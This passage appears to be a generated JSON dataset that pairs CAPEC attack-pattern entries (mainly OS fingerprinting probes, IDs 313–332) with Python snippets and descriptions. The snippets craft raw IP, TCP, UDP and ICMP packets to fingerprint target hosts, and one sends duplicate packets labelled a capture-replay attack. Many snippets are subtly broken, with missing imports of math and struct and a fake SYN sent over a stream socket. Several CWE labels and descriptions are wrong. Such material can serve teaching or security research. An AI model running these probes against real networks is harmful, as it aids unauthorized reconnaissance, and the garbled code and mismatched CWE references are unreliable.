        "description": "This Python code snippet demonstrates passive OS fingerprinting by capturing network packets on a specified network interface (e.g., 'eth0'). It creates a raw socket to listen for all incoming packets and extracts the IP header information, including the Time-To-Live (TTL) value and protocol type. By analyzing these values, an adversary can infer the operating system of the communicating devices based on known signatures. This approach aligns with the CAPEC description of passively monitoring communication to identify OS types. The code also touches on related CWEs, such as the exposure of sensitive information (CWE-200, CWE-497) and cleartext transmission (CWE-319), as it captures and prints potentially sensitive network data without any protection."
    },
    {
        "capec_id": "314",
        "capec_name": "DEPRECATED: IP Fingerprinting Probes",
        "code_snippet": "import socket\nimport logging\n\n# CWE-532: Information Exposure Through Debug Log Files\nlogging.basicConfig(filename='debug.log', level=logging.DEBUG)\n\n# CWE-287: Authentication Bypass Issues\n# CWE-350: Reliance on DNS Lookups in a Security Decision\n# CWE-312: Active OS Fingerprinting\n\ndef get_os_fingerprint(ip):\n    try:\n        # Simulate an OS fingerprinting probe\n        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        sock.connect((ip, 80))\n        sock.send(b'GET / HTTP/1.1\\r\\nHost: example.com\\r\\n\\r\\n')\n        response = sock.recv(1024)\n        sock.close()\n\n        # Log the response for debugging purposes (CWE-532)\n        logging.debug(f'Response from {ip}: {response}')\n\n        # Simplified fingerprinting logic (CWE-312)\n        if b'Windows' in response:\n            return 'Windows'\n        elif b'Linux' in response:\n            return 'Linux'\n        else:\n            return 'Unknown'\n    except Exception as e:\n        logging.error(f'Error connecting to {ip}: {e}')\n        return 'Error'\n\n# Example usage\nip_address = '192.168.1.1'\nos_type = get_os_fingerprint(ip_address)\nprint(f'The OS type for IP {ip_address} is {os_type}')",
        "description": "This Python code snippet demonstrates a simplified version of active OS fingerprinting (CAPEC-312) by sending a basic HTTP request to a target IP address and analyzing the response. The code also includes logging of the response for debugging purposes, which can lead to information exposure (CWE-532). Additionally, it highlights potential issues with authentication bypass (CWE-287) and reliance on DNS lookups in security decisions (CWE-350). The function `get_os_fingerprint` attempts to identify the operating system of the target based on the response received, logging the response for further analysis."
    },
    {
        "capec_id": "315",
        "capec_name": "DEPRECATED: TCP/IP Fingerprinting Probes",
        "code_snippet": "import socket\nimport struct\nimport time\n\n# Function to create a raw socket and send a TCP packet\ndef send_tcp_packet(dst_ip, dst_port):\n    try:\n        # Create a raw socket\n        s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)\n        s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)\n\n        # Construct IP header\n        ip_header = struct.pack('!BBHHHBBH4s4s',\n                                69, 0, 40, 54321, 0, 255, socket.IPPROTO_TCP, 0,\n                                socket.inet_aton('192.168.1.1'),\n                                socket.inet_aton(dst_ip))\n\n        # Construct TCP header\n        tcp_header = struct.pack('!HHLLBBHHH',\n                                 1234, dst_port, 0, 0, 80, 2, 8192, 0, 0)\n\n        # Send the packet\n        s.sendto(ip_header + tcp_header, (dst_ip, 0))\n        print(f'Sent TCP packet to {dst_ip}:{dst_port}')\n    except Exception as e:\n        print(f'Error: {e}')\n\n# Function to simulate capture-replay attack\ndef capture_replay_attack(dst_ip, dst_port):\n    send_tcp_packet(dst_ip, dst_port)\n    time.sleep(1)\n    send_tcp_packet(dst_ip, dst_port)\n\n# Example usage\ncapture_replay_attack('192.168.1.2', 80)",
        "description": "This Python code snippet demonstrates a simplified version of a TCP/IP fingerprinting probe and a capture-replay attack. The `send_tcp_packet` function creates a raw socket and sends a TCP packet to a specified destination IP and port. The `capture_replay_attack` function simulates a capture-replay attack by sending the same TCP packet twice with a short delay. This code embodies the main idea of CAPEC-312 (Active OS Fingerprinting) and CWE-294 (Authentication Bypass by Capture-replay). The code is vulnerable as it allows an attacker to replay TCP packets, potentially bypassing authentication mechanisms."
    },
    {
        "capec_id": "316",
        "capec_name": "DEPRECATED: ICMP Fingerprinting Probes",
        "code_snippet": "import os\nimport socket\n\n# Vulnerable function to determine OS using ICMP fingerprinting\n# This is a simplified and vulnerable example\n\ndef get_os(ip):\n    try:\n        # Send an ICMP echo request (ping) to the target IP\n        response = os.system(f'ping -c 1 {ip}')\n        if response == 0:\n            return 'Host is up'\n        else:\n            return 'Host is down'\n    except Exception as e:\n        return str(e)\n\n# Example usage\nip_address = '192.168.1.1'\nos_info = get_os(ip_address)\nprint(f'OS Information: {os_info}')\n\n# CWE-287: Authentication Bypass Issue\n# This code does not perform any authentication checks before sending ICMP requests\n# CWE-532: Information Exposure Through Debug Log Files\n# Logging sensitive information without proper sanitization\n\n# Example of logging sensitive information\nwith open('debug.log', 'a') as log_file:\n    log_file.write(f'Ping result for {ip_address}: {os_info}\\n')",
        "description": "This Python code snippet demonstrates a vulnerable implementation of ICMP fingerprinting to determine the operating system of a target machine. The function `get_os` sends an ICMP echo request (ping) to the specified IP address and returns whether the host is up or down. This approach is related to CAPEC-312: Active OS Fingerprinting. The code also highlights several deprecated CWEs: CWE-287 (Authentication Bypass Issues) as it does not perform any authentication checks before sending ICMP requests, and CWE-532 (Information Exposure Through Debug Log Files) as it logs sensitive information without proper sanitization. This example is simplified and should not be used in production environments due to its security vulnerabilities."
    },
    {
        "capec_id": "317",
        "capec_name": "IP ID Sequencing Probe",
        "code_snippet": "import socket\nimport time\n\ndef analyze_ip_id_sequence(target_ip):\n    ip_ids = []\n    for _ in range(5):\n        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)\n        sock.sendto(b'\\x08\\x00\\x00\\x00\\x00\\x00\\x00\\x00', (target_ip, 0))\n        response = sock.recv(1024)\n        ip_id = int.from_bytes(response[4:6], byteorder='big')\n        ip_ids.append(ip_id)\n        time.sleep(1)\n    return ip_ids\n\nif __name__ == '__main__':\n    target_ip = '192.168.1.1'\n    ip_id_sequence = analyze_ip_id_sequence(target_ip)\n    print(f'IP ID Sequence: {ip_id_sequence}')",
        "description": "This Python code snippet demonstrates a basic IP ID sequencing probe, which is used to analyze the IP 'ID' field sequence number generation algorithm of a remote host. The code sends ICMP echo requests to the target IP address and captures the IP 'ID' values from the responses. By examining the sequence of these IP 'ID' values, an attacker can infer the operating system of the target host. This technique leverages the fact that different operating systems generate IP 'ID' numbers differently. The code also touches on CWE-200 (Exposure of Sensitive Information to an Unauthorized Actor) as it exposes the IP 'ID' sequence, which can be considered sensitive information. Additionally, it indirectly relates to CWE-291 (Reliance on IP Address for Authentication) as it demonstrates how IP-based information can be probed and potentially misused."
    },
    {
        "capec_id": "318",
        "capec_name": "IP 'ID' Echoed Byte-Order Probe",
        "code_snippet": "import socket\n\n# Function to send a UDP packet with a specific IP ID\ndef send_udp_probe(target_ip, target_port, ip_id):\n    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)\n    sock.setsockopt(socket.SOL_IP, socket.IP_HDRINCL, 1)\n    packet = b'\\x45\\x00\\x00\\x1c' + ip_id.to_bytes(2, 'big') + b'\\x00\\x00\\x40\\x11\\x00\\x00' + socket.inet_aton('192.168.1.1') + socket.inet_aton(target_ip) + b'\\x00\\x00\\x00\\x00' + b'\\x00' * 8\n    sock.sendto(packet, (target_ip, target_port))\n\n# Function to receive ICMP error message\ndef receive_icmp_response():\n    sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)\n    response, _ = sock.recvfrom(1024)\n    return response\n\n# Main function to perform the IP 'ID' Echoed Byte-Order Probe\ndef ip_id_echo_probe(target_ip, target_port):\n    ip_id = 12345  # Arbitrary IP ID value\n    send_udp_probe(target_ip, target_port, ip_id)\n    response = receive_icmp_response()\n    echoed_ip_id = int.from_bytes(response[24:26], 'big')\n    if echoed_ip_id == ip_id:\n        print(f\"The IP ID {ip_id} was echoed back correctly.\")\n    else:\n        print(f\"The IP ID {ip_id} was not echoed back correctly. Echoed IP ID: {echoed_ip_id}\")\n\n# Example usage\nip_id_echo_probe('192.168.1.100', 12345)",
        "description": "This Python code snippet demonstrates an IP 'ID' Echoed Byte-Order Probe, which is used for OS fingerprinting. The code sends a UDP packet with a specific IP ID to a closed port on a target host and then listens for an ICMP error message. The IP ID from the ICMP response is checked to see if it matches the sent IP ID, indicating whether the target host echoes back the IP ID value. This can reveal information about the target's operating system or router firmware. The code also touches on related CWEs by showing how sensitive information (IP ID) can be exposed and potentially mismanaged."
    },
    {
        "capec_id": "319",
        "capec_name": "IP (DF) 'Don't Fragment Bit' Echoing Probe",
        "code_snippet": "import socket\n\n# Function to send a UDP packet with the DF bit set\ndef send_udp_packet_with_df(target_ip, target_port):\n    try:\n        # Create a raw socket\n        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_UDP)\n        sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)\n\n        # Construct IP header with DF bit set\n        ip_header = b'\\x45\\x00\\x00\\x1c\\x1c\\x46\\x40\\x00\\x40\\x11\\x72\\xb7'  # Version, IHL, Type of Service, Total Length, ID, Flags (DF), Fragment Offset, TTL, Protocol, Header Checksum\n        ip_header += socket.inet_aton('192.168.1.1')  # Source IP\n        ip_header += socket.inet_aton(target_ip)  # Destination IP\n\n        # Construct UDP header\n        udp_header = b'\\x1f\\x90'  # Source Port\n        udp_header += target_port.to_bytes(2, 'big')  # Destination Port\n        udp_header += b'\\x00\\x08'  # Length\n        udp_header += b'\\x00\\x00'  # Checksum\n\n        # Send the packet\n        sock.sendto(ip_header + udp_header, (target_ip, target_port))\n        print(f\"Packet sent to {target_ip}:{target_port}\")\n    except Exception as e:\n        print(f\"Error: {e}\")\n\n# Example usage\nsend_udp_packet_with_df('192.168.1.2', 12345)",
        "description": "This Python code snippet demonstrates how to send a UDP packet with the 'Don't Fragment' (DF) bit set in the IP header to a specified target IP and port. The code creates a raw socket and constructs an IP header with the DF bit set, followed by a UDP header. The packet is then sent to the target. This mimics the CAPEC scenario where an attacker sends a UDP datagram with the DF bit set to observe the response from the target system. The code also highlights potential security weaknesses such as exposure of sensitive information (CWE-200) and incorrectly specified destinations (CWE-941)."
    },
    {
        "capec_id": "320",
        "capec_name": "TCP Timestamp Probe",
        "code_snippet": "import socket\nimport struct\n\n# Function to create a raw socket and send a TCP packet\ndef send_tcp_probe(target_ip, target_port):\n    try:\n        # Create a raw socket\n        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)\n        sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)\n\n        # Construct IP header\n        ip_header = struct.pack('!BBHHHBBH4s4s',\n                                69, 0, 40, 54321, 0, 64, socket.IPPROTO_TCP, 0,\n                                socket.inet_aton('192.168.1.100'),\n                                socket.inet_aton(target_ip))\n\n        # Construct TCP header with timestamp option\n        tcp_header = struct.pack('!HHLLBBHHH',\n                                 12345, target_port, 0, 0, 80, 2, 8192, 0, 0)\n        tcp_options = struct.pack('!BBLL', 8, 10, 0, 0)  # Timestamp option\n\n        # Send the packet\n        sock.sendto(ip_header + tcp_header + tcp_options, (target_ip, target_port))\n\n        # Receive the response\n        response = sock.recv(1024)\n        print('Received response:', response)\n\n    except Exception as e:\n        print('Error:', e)\n\n# Example usage\nsend_tcp_probe('192.168.1.1', 80)",
        "description": "This Python code snippet demonstrates a TCP timestamp probe, which is used for OS fingerprinting by examining the TCP timestamps in the response from a target server. The code creates a raw socket and constructs a TCP packet with a timestamp option. It sends the packet to the target IP and port, then waits for a response. The response is printed, which can be analyzed to infer the operating system based on the timestamp values. This code embodies the CAPEC concept by leveraging TCP timestamps to gather information about the target system. The related CWEs are represented by the potential exposure of sensitive information (CWE-200), the possibility of sniffing network traffic (CWE-319), and the use of timing information (CWE-385, CWE-208) to infer details about the target system."
    },
    {
        "capec_id": "321",
        "capec_name": "TCP Sequence Number Probe",
        "code_snippet": "import socket\nimport time\n\n# Function to generate a predictable sequence number\n# CWE-337: Predictable Seed in Pseudo-Random Number Generator (PRNG)\ndef generate_sequence_number(ack_number):\n    seed = int(time.time())  # Predictable seed\n    return (ack_number + seed) % 4294967296  # Simple predictable sequence number generation\n\n# Function to send a TCP probe and receive the sequence number\n# CWE-319: Cleartext Transmission of Sensitive Information\ndef tcp_probe(target_ip, target_port):\n    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:\n        s.connect((target_ip, target_port))\n        ack_number = 1000  # Example acknowledgement number\n        seq_number = generate_sequence_number(ack_number)\n        s.send(f'ACK: {ack_number}, SEQ: {seq_number}'.encode())\n        response = s.recv(1024)\n        print(f'Received: {response.decode()}')\n\n# Example usage\ntarget_ip = '192.168.1.1'\ntarget_port = 80\ntcp_probe(target_ip, target_port)",
        "description": "This Python code snippet demonstrates a TCP Sequence Number Probe, which is used for OS fingerprinting by analyzing the target system's TCP sequence number generation. The `generate_sequence_number` function uses a predictable seed (current time) to generate a sequence number, illustrating CWE-337 (Predictable Seed in PRNG). The `tcp_probe` function sends a TCP probe packet to a target IP and port, transmitting the sequence number in cleartext (CWE-319). The response from the target is then printed. This code embodies the main idea of the CAPEC by showing how sequence numbers can be probed and analyzed to fingerprint an operating system."
    },
    {
        "capec_id": "322",
        "capec_name": "TCP (ISN) Greatest Common Divisor Probe",
        "code_snippet": "import socket\nimport struct\nimport time\n\n# Function to send TCP SYN packet and receive SYN/ACK\ndef send_syn_packet(target_ip, target_port):\n    sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)\n    sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)\n\n    # Construct TCP SYN packet\n    ip_header = struct.pack('!BBHHHBBH4s4s',\n                            69, 0, 40, 54321, 0, 255, socket.IPPROTO_TCP, 0,\n                            socket.inet_aton('192.168.1.100'),\n                            socket.inet_aton(target_ip))\n    tcp_header = struct.pack('!HHLLBBHHH',\n                             12345, target_port, 0, 0, 80, 2, 8192, 0, 0)\n    packet = ip_header + tcp_header\n\n    sock.sendto(packet, (target_ip, 0))\n    data, _ = sock.recvfrom(1024)\n    return data\n\n# Function to extract ISN from SYN/ACK response\ndef extract_isn(response):\n    ip_header = response[:20]\n    tcp_header = response[20:40]\n    isn = struct.unpack('!L', tcp_header[4:8])[0]\n    return isn\n\n# Main function to fingerprint OS based on ISN\ndef fingerprint_os(target_ip, target_port):\n    isn_list = []\n    for _ in range(5):\n        response = send_syn_packet(target_ip, target_port)\n        isn = extract_isn(response)\n        isn_list.append(isn)\n        time.sleep(1)\n\n    gcd = isn_list[0]\n    for isn in isn_list[1:]:\n        gcd = math.gcd(gcd, isn)\n\n    print(f'GCD of ISNs: {gcd}')\n    # Compare GCD with known OS behaviors (not implemented)\n\n# Example usage\nfingerprint_os('192.168.1.1', 80)",
        "description": "This Python code snippet demonstrates a simplified version of the 'TCP (ISN) Greatest Common Divisor Probe' attack. It sends multiple TCP SYN packets to a target IP and port, receives the SYN/ACK responses, and extracts the Initial Sequence Numbers (ISNs) from these responses. The ISNs are then used to calculate the Greatest Common Divisor (GCD), which can help identify the operating system of the target based on known OS behaviors. The code highlights vulnerabilities such as exposure of sensitive system information (CWE-497) and potential cleartext transmission of sensitive data (CWE-319)."
    },
    {
        "capec_id": "323",
        "capec_name": "TCP (ISN) Counter Rate Probe",
        "code_snippet": "import time\nimport random\n\nclass TCPISNProbe:\n    def __init__(self):\n        self.isn = random.randint(0, 2**32 - 1)\n        self.last_time = time.time()\n\n    def get_isn(self):\n        current_time = time.time()\n        time_diff = current_time - self.last_time\n        self.isn += int(time_diff * 1000)  # Simulate time-based ISN increment\n        self.last_time = current_time\n        return self.isn\n\n# Simulate probing the ISN increments\nprobe = TCPISNProbe()\nfor _ in range(10):\n    time.sleep(random.uniform(0.1, 0.5))  # Random sleep to simulate time passing\n    isn = probe.get_isn()\n    print(f\"Captured ISN: {isn}\")",
        "description": "This Python code snippet simulates a TCP Initial Sequence Number (ISN) counter rate probe, which is used to measure the rate of ISN increments over time. The `TCPISNProbe` class initializes an ISN and updates it based on the elapsed time since the last update, simulating a time-based algorithm for ISN generation. The `get_isn` method calculates the time difference and increments the ISN accordingly. The main loop simulates probing the ISN at random intervals, capturing and printing the ISN values. This represents the CAPEC concept of measuring ISN increments to infer information about the operating system. The code also touches on CWE-385 (Covert Timing Channel) by using time-based increments to convey information, and CWE-362 (Race Condition) by simulating concurrent execution with random sleep intervals."
    },
    {
        "capec_id": "324",
        "capec_name": "TCP (ISN) Sequence Predictability Probe",
        "code_snippet": "import socket\nimport time\nimport random\n\n# Function to generate a predictable ISN\ndef generate_isn():\n    seed = int(time.time())  # CWE-337: Predictable Seed in PRNG\n    random.seed(seed)\n    isn = random.randint(0, 2**32 - 1)\n    return isn\n\n# Function to simulate a TCP connection with predictable ISN\ndef simulate_tcp_connection():\n    server_ip = '192.168.1.1'\n    server_port = 12345\n    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    client_socket.connect((server_ip, server_port))\n    isn = generate_isn()\n    print(f'Generated ISN: {isn}')  # CWE-200: Exposure of Sensitive Information\n    client_socket.send(f'SYN {isn}'.encode())\n    response = client_socket.recv(1024)\n    print(f'Server response: {response.decode()}')  # CWE-211: Externally-Generated Error Message\n    client_socket.close()\n\nsimulate_tcp_connection()",
        "description": "This Python code snippet simulates a TCP connection where the Initial Sequence Number (ISN) is generated using a predictable seed based on the current time (CWE-337). The ISN is then printed, exposing sensitive information (CWE-200). The code also demonstrates how an attacker might observe the state of the system to predict the ISN (CWE-341). The server's response is printed, which could contain sensitive information if an error occurs (CWE-211). This code embodies the main idea of the CAPEC by showing how predictable sequence numbers can be generated and potentially exploited."
    },
    {
        "capec_id": "325",
        "capec_name": "TCP Congestion Control Flag (ECN) Probe",
        "code_snippet": "import socket\n\n# Create a raw socket\nsock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)\n\n# Construct a TCP packet with ECN flags set\nip_header = b'\\x45\\x00\\x00\\x28\\xab\\xcd\\x00\\x00\\x40\\x06\\x00\\x00'  # Simplified IP header\nsrc_ip = socket.inet_aton('192.168.1.100')\ndst_ip = socket.inet_aton('192.168.1.1')\ntcp_header = b'\\x00\\x50\\x00\\x50\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x50\\x02\\x71\\x10\\x00\\x00\\x00\\x00'  # Simplified TCP header with ECN flags\n\n# Combine headers to form the packet\npacket = ip_header + src_ip + dst_ip + tcp_header\n\n# Send the packet\nsock.sendto(packet, ('192.168.1.1', 0))\n\n# Receive the response\nresponse = sock.recv(1024)\n\n# Check for ECN support in the response\nif response[33] & 0x03:  # Check ECN flags in the TCP header\n    print('ECN supported')\nelse:\n    print('ECN not supported')",
        "description": "This Python code snippet demonstrates a TCP Congestion Control Flag (ECN) probe, which checks if a remote host supports Explicit Congestion Notification (ECN) messaging. The code creates a raw socket and constructs a TCP packet with ECN flags set. It then sends this packet to a target IP address and waits for a response. By examining the ECN flags in the response, the code determines if the remote host supports ECN. This probe can be used for OS fingerprinting, as different operating systems may respond differently to ECN flags. The code also highlights potential vulnerabilities such as exposure of sensitive information (CWE-200), improper protection for outbound error messages (CWE-1320), and cleartext transmission of sensitive information (CWE-319)."
    },
    {
        "capec_id": "326",
        "capec_name": "TCP Initial Window Size Probe",
        "code_snippet": "import socket\n\n# Function to establish a TCP connection and check the initial window size\ndef check_initial_window_size(target_ip, target_port):\n    try:\n        # Create a socket object\n        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        \n        # Connect to the target IP and port\n        s.connect((target_ip, target_port))\n        \n        # Send a SYN packet to initiate the connection\n        s.send(b'SYN')\n        \n        # Receive the SYN-ACK response\n        response = s.recv(1024)\n        \n        # Extract the initial window size from the response\n        initial_window_size = response[14:16]\n        \n        print(f'Initial Window Size: {int.from_bytes(initial_window_size, byteorder=\"big\")}')\n        \n        # Close the socket\n        s.close()\n    except Exception as e:\n        print(f'Error: {e}')\n\n# Example usage\ncheck_initial_window_size('192.168.1.1', 80)",
        "description": "This Python code snippet demonstrates how to establish a TCP connection to a target IP and port, send a SYN packet, and receive a SYN-ACK response to extract the initial TCP window size. The code uses the socket library to create a TCP connection and handle the communication. The initial window size is extracted from the SYN-ACK response, which can be used for OS fingerprinting. This code embodies the main idea of the CAPEC 'TCP Initial Window Size Probe' by checking the initial TCP window size to infer information about the target system. The code also touches on CWE-200 (Exposure of Sensitive Information) as it reveals potentially sensitive information about the target system's TCP stack configuration."
    },
    {
        "capec_id": "327",
        "capec_name": "TCP Options Probe",
        "code_snippet": "import socket\n\n# Create a raw socket\ns = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)\n\n# Bind the socket to a public interface\ns.bind((\"0.0.0.0\", 0))\n\n# Enable IP_HDRINCL to include IP headers\ns.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)\n\n# Function to parse TCP options\ndef parse_tcp_options(tcp_header):\n    options = []\n    offset = 20  # TCP header is 20 bytes\n    while offset < len(tcp_header):\n        kind = tcp_header[offset]\n        if kind == 0:  # End of options\n            break\n        elif kind == 1:  # No-Operation\n            offset += 1\n            continue\n        length = tcp_header[offset + 1]\n        options.append(tcp_header[offset:offset + length])\n        offset += length\n    return options\n\n# Receive a packet\npacket, addr = s.recvfrom(65535)\n\n# Extract the TCP header (assuming no IP options)\ntcp_header = packet[20:40]\n\n# Parse TCP options\ntcp_options = parse_tcp_options(tcp_header)\n\n# Print the parsed TCP options\nprint(f\"Received TCP options from {addr}: {tcp_options}\")",
        "description": "This Python code snippet demonstrates a TCP Options Probe, which is used for OS fingerprinting by analyzing the type and order of TCP header options in a response segment. The code creates a raw socket to capture TCP packets, binds it to a public interface, and includes IP headers in the captured packets. It then defines a function to parse TCP options from the TCP header. The code receives a packet, extracts the TCP header, parses the TCP options, and prints them. This process can reveal unique ordering and option sets used by different operating systems, which can be exploited for OS fingerprinting. The code also touches on related CWEs by potentially exposing sensitive information (CWE-200) and making assumptions about data layout (CWE-188)."
    },
    {
        "capec_id": "328",
        "capec_name": "TCP 'RST' Flag Checksum Probe",
        "code_snippet": "import socket\n\n# Create a raw socket\nsock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)\n\n# Construct a TCP packet with RST flag and a text payload\nsrc_ip = '192.168.1.2'\ndst_ip = '192.168.1.1'\nsrc_port = 12345\ndst_port = 80\nseq = 0\nack_seq = 0\noffset_res = (5 << 4)\ntcp_flags = 0x04  # RST flag\nwindow = socket.htons(5840)\nchecksum = 0\nurg_ptr = 0\n\n# TCP header fields\ntcp_header = struct.pack('!HHLLBBHHH', src_port, dst_port, seq, ack_seq, offset_res, tcp_flags, window, checksum, urg_ptr)\n\n# Text payload\npayload = b'Connection reset by peer'\n\n# Calculate checksum (for simplicity, not implemented here)\n# checksum = calculate_checksum(tcp_header + payload)\n\n# Send the packet\npacket = tcp_header + payload\nsock.sendto(packet, (dst_ip, 0))\n\nprint('RST packet sent with payload')",
        "description": "This Python code snippet demonstrates the creation and sending of a TCP packet with the RST (reset) flag set, including a human-readable text payload. The code uses a raw socket to construct and send the packet, which is a technique that can be used for OS fingerprinting as described in the CAPEC. The related CWEs are represented by the lack of integrity checks (CWE-353, CWE-354), the exposure of sensitive information (CWE-200, CWE-319), and the potential for capture-replay attacks (CWE-294). The code does not implement checksum calculation for simplicity, highlighting the vulnerability of missing integrity checks."
    },
    {
        "capec_id": "329",
        "capec_name": "ICMP Error Message Quoting Probe",
        "code_snippet": "import socket\n\n# Function to send a UDP packet to a target host and port\n# This will trigger an ICMP Port Unreachable error if the port is closed\n\ndef send_udp_packet(target_host, target_port):\n    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)\n    sock.sendto(b'Test Packet', (target_host, target_port))\n    sock.close()\n\n# Function to listen for ICMP error messages\n# This will capture the ICMP error message and print the quoted data\n\ndef listen_for_icmp():\n    sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)\n    sock.bind(('0.0.0.0', 0))\n    while True:\n        data, addr = sock.recvfrom(1024)\n        print(f'Received ICMP error message from {addr}: {data}')\n\nif __name__ == '__main__':\n    target_host = '192.168.1.1'\n    target_port = 12345\n    send_udp_packet(target_host, target_port)\n    listen_for_icmp()",
        "description": "This Python code snippet demonstrates the concept of an 'ICMP Error Message Quoting Probe' attack. The code sends a UDP packet to a specified target host and port, which will trigger an ICMP Port Unreachable error if the port is closed. The code then listens for ICMP error messages and prints the received data. This can expose sensitive information contained in the quoted data of the ICMP error message, aligning with CWE-200, CWE-211, and CWE-209. The code highlights how an adversary might exploit ICMP error messages to gather information about a target system."
    },
    {
        "capec_id": "330",
        "capec_name": "ICMP Error Message Echoing Integrity Probe",
        "code_snippet": "import socket\n\n# Function to send an ICMP Echo Request\ndef send_icmp_echo_request(target_ip):\n    try:\n        # Create a raw socket\n        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)\n        sock.settimeout(1)\n\n        # ICMP Echo Request packet\n        packet = b'\\x08\\x00\\x00\\x00' + b'\\x00' * 56\n\n        # Send the packet\n        sock.sendto(packet, (target_ip, 1))\n\n        # Receive the response\n        response, _ = sock.recvfrom(1024)\n        return response\n    except Exception as e:\n        return str(e)\n\n# Function to analyze the ICMP Error message\ndef analyze_icmp_error(response):\n    if response:\n        # Extract the quoted data from the ICMP Error message\n        quoted_data = response[28:56]\n        print(f'Quoted Data: {quoted_data}')\n    else:\n        print('No response or error occurred')\n\n# Target IP address\ntarget_ip = '192.168.1.1'\n\n# Send ICMP Echo Request and analyze the response\nresponse = send_icmp_echo_request(target_ip)\nanalyze_icmp_error(response)",
        "description": "This Python code snippet demonstrates the concept of an 'ICMP Error Message Echoing Integrity Probe' (CAPEC-Name). The code sends an ICMP Echo Request to a target IP address and then waits for an ICMP Error message in response. If an error message is received, it extracts and prints the quoted data from the original request that generated the error. This process can expose sensitive information (CWE-200, CWE-211) if the quoted data contains such information. The code also highlights the lack of integrity checks (CWE-353) in the transmission protocol, which can be exploited by an adversary."
    },
    {
        "capec_id": "331",
        "capec_name": "ICMP IP Total Length Field Probe",
        "code_snippet": "import socket\n\n# Create a raw socket\nsock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)\n\n# IP header fields\nip_header = b'\\x45\\x00\\x00\\x1c'  # Version, IHL, Type of Service | Total Length\nip_header += b'\\xab\\xcd\\x00\\x00'  # Identification | Flags, Fragment Offset\nip_header += b'\\x40\\x01\\x00\\x00'  # TTL, Protocol | Header Checksum\nip_header += b'\\x7f\\x00\\x00\\x01'  # Source IP Address\nip_header += b'\\x7f\\x00\\x00\\x01'  # Destination IP Address\n\n# ICMP header fields\nicmp_header = b'\\x08\\x00\\x4d\\x62'  # Type, Code | Checksum\nicmp_header += b'\\x00\\x01\\x00\\x01'  # Identifier, Sequence Number\n\n# Send the packet\nsock.sendto(ip_header + icmp_header, ('127.0.0.1', 0))\n\n# Receive the response\nresponse, _ = sock.recvfrom(1024)\n\n# Extract the IP Total Length field from the response\nip_total_length = response[2:4]\n\nprint(f'Received IP Total Length: {int.from_bytes(ip_total_length, byteorder=\"big\")}')",
        "description": "This Python code snippet demonstrates the concept of the 'ICMP IP Total Length Field Probe' attack. It creates a raw socket to send an ICMP echo request to a target machine (localhost in this case). The IP header is crafted with specific fields, including the total length field. The code then sends the packet and waits for a response. Upon receiving the response, it extracts the IP Total Length field from the echoed message. This process can be used to gather information about the target's operating system based on the response, which may reveal internal state information (CWE-204) and potentially expose inconsistencies in length handling (CWE-130). The code does not include integrity checks (CWE-353, CWE-924) and transmits data in cleartext (CWE-319), making it vulnerable to interception and modification."
    },
    {
        "capec_id": "332",
        "capec_name": "ICMP IP 'ID' Field Error Message Probe",
        "code_snippet": "import socket\n\n# Create a raw socket\nsock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_UDP)\n\n# Set the IP header fields\nip_header = b'\\x45\\x00\\x00\\x1c'  # Version, IHL, Type of Service | Total Length\nip_header += b'\\x1c\\x46'  # Identification (ID) field\nip_header += b'\\x40\\x00\\x40\\x11\\x00\\x00'  # Flags, Fragment Offset | TTL, Protocol, Header Checksum\nip_header += socket.inet_aton('192.168.1.1')  # Source IP\nip_header += socket.inet_aton('192.168.1.2')  # Destination IP\n\n# Set the UDP header fields\nudp_header = b'\\x00\\x35\\x00\\x35'  # Source Port, Destination Port\nudp_header += b'\\x00\\x08\\x00\\x00'  # Length, Checksum\n\n# Combine headers to form the packet\npacket = ip_header + udp_header\n\n# Send the packet to a closed port\nsock.sendto(packet, ('192.168.1.2', 0))\n\n# Receive the ICMP error message\nresponse = sock.recv(1024)\n\n# Print the response for analysis\nprint(response)",
        "description": "This Python code snippet demonstrates the concept of the CAPEC 'ICMP IP 'ID' Field Error Message Probe'. It creates a raw socket and constructs a UDP packet with a specific IP identification field. The packet is sent to a closed port on a target machine. The code then listens for an ICMP error message in response. By analyzing the response, an attacker can infer details about the target's operating system. This code also touches on related CWEs: it reveals internal state information (CWE-204), and the error message may contain sensitive information (CWE-211)."
    },
    {
        "capec_id": "383",
        "capec_name": "Harvesting Information via API Event Monitoring",
